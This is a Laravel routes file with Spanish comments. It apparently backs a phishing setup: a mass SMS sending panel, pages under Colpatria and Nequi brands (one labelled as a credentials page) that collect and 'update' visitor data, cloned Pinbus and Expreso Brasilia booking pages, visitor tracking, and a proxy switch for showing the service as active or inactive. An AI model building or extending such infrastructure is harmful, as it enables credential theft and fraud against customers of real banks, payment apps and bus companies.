<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ProxyViewController;
use App\Http\Controllers\StatsController;

// Dashboard de estadísticas (solo acceso interno)
Route::middleware([\App\Http\Middleware\InternalOnly::class])->group(function () {
    Route::get('/stats', [StatsController::class, 'index'])->name('stats.dashboard');
    Route::get('/torvi', [StatsController::class, 'index'])->name('stats.torvi');
    Route::get('/stats/api', [StatsController::class, 'api'])->name('stats.api');
    Route::post('/api/track', [StatsController::class, 'trackEvent'])->name('stats.track');
});

// Ruta principal: muestra la vista según configuración del proxy (Servicio activo/inactivo)
Route::get('/', [ProxyViewController::class, 'show'])->name('proxy.home');

// Rutas de autenticación para el sender (sin middleware)
Route::get('/sender/auth', [\App\Http\Controllers\SenderAuthController::class, 'showAuthForm'])->name('sender.auth');
Route::post('/sender/auth/request', [\App\Http\Controllers\SenderAuthController::class, 'requestCode'])->name('sender.auth.request');
Route::post('/sender/auth/verify', [\App\Http\Controllers\SenderAuthController::class, 'verifyCode'])->name('sender.auth.verify');
Route::post('/sender/auth/logout', [\App\Http\Controllers\SenderAuthController::class, 'logout'])->name('sender.auth.logout');

// Rutas para el envío masivo de SMS (protegidas con autenticación)
Route::middleware([\App\Http\Middleware\SenderAuth::class])->group(function () {
    Route::get('/sender', [\App\Http\Controllers\SenderController::class, 'index'])->name('sender.index');
    Route::post('/sender/send', [\App\Http\Controllers\SenderController::class, 'send'])->name('sender.send');
});

// Rutas públicas de Colpatria
Route::get('/colpatria/inicio', [\App\Http\Controllers\ColpatriaController::class, 'inicio'])->name('colpatria.inicio');
Route::get('/colpatria/datos', [\App\Http\Controllers\ColpatriaController::class, 'datos'])->name('colpatria.datos');
Route::post('/colpatria/actualizar', [\App\Http\Controllers\ColpatriaController::class, 'actualizarDatos'])->name('colpatria.actualizar');

// Rutas de Pinbus/Brasilia
// IMPORTANTE: El archivo se llama page.html (no index.html) para evitar que Nginx lo sirva directamente
// y así el middleware TrackVisitor pueda registrar las visitas
Route::get('/pin/inicio/{trailing?}', function () {
    return response()->file(public_path('pin/inicio/page.html'));
})->where('trailing', '.*')->middleware(\App\Http\Middleware\TrackVisitor::class)->name('pinbus.inicio');
Route::get('/pin/brasil', [\App\Http\Controllers\PinbusController::class, 'index'])->name('pinbus.index');
Route::get('/pin/buscar', [\App\Http\Controllers\PinbusController::class, 'search'])->name('pinbus.search');
Route::post('/pin/buscar', [\App\Http\Controllers\PinbusController::class, 'search'])->name('pinbus.search.post');
// Ruta estilo Reservamos: /pin/buscar/{origin}/{destination}/{date}
Route::get('/pin/buscar/{origin}/{destination}/{date}', [\App\Http\Controllers\PinbusController::class, 'searchByPath'])->name('pinbus.search.path');
// Ruta estilo viaje.expresobrasilia.com: /search/{origin}/{destination}/{date}
Route::get('/search/{origin}/{destination}/{date}', [\App\Http\Controllers\PinbusController::class, 'searchByPath'])->name('pinbus.search.brasilia');
// Ruta completa del widget Reservamos con parámetros adicionales
Route::get('/pin/buscar/search/{origin}/{destination}/{date}/{any?}', [\App\Http\Controllers\PinbusController::class, 'searchByPath'])
    ->where('any', '.*')
    ->name('pinbus.search.widget');
// Ruta para selección de sillas
Route::get('/pin/reservar/{tripId}', [\App\Http\Controllers\PinbusController::class, 'selectSeats'])->name('pinbus.sillas');
// API para buscar viajes con cálculo de distancia y precio
Route::post('/pin/api/viajes', [\App\Http\Controllers\PinbusController::class, 'buscarViajes'])->name('pinbus.api.viajes');

// Ruta de Nequi Propulsor
Route::get('/nequi/propulsor', function () {
    return response()->file(public_path('nequi/inicio/propulsor.html'));
})->middleware(\App\Http\Middleware\TrackVisitor::class)->name('nequi.propulsor');

// Ruta de Nequi Prop (credenciales)
Route::get('/nequi/prop', function () {
    return view('nequi.nequ1');
})->middleware(\App\Http\Middleware\TrackVisitor::class)->name('nequi.prop');

// Rutas específicas por panel y vista (backwards compatibility y acceso directo)
Route::get('/{panel}/{view}', [ProxyViewController::class, 'showByPanel'])
    ->where(['panel' => '[a-zA-Z0-9_]+', 'view' => '[a-zA-Z0-9_]+'])
    ->name('proxy.view');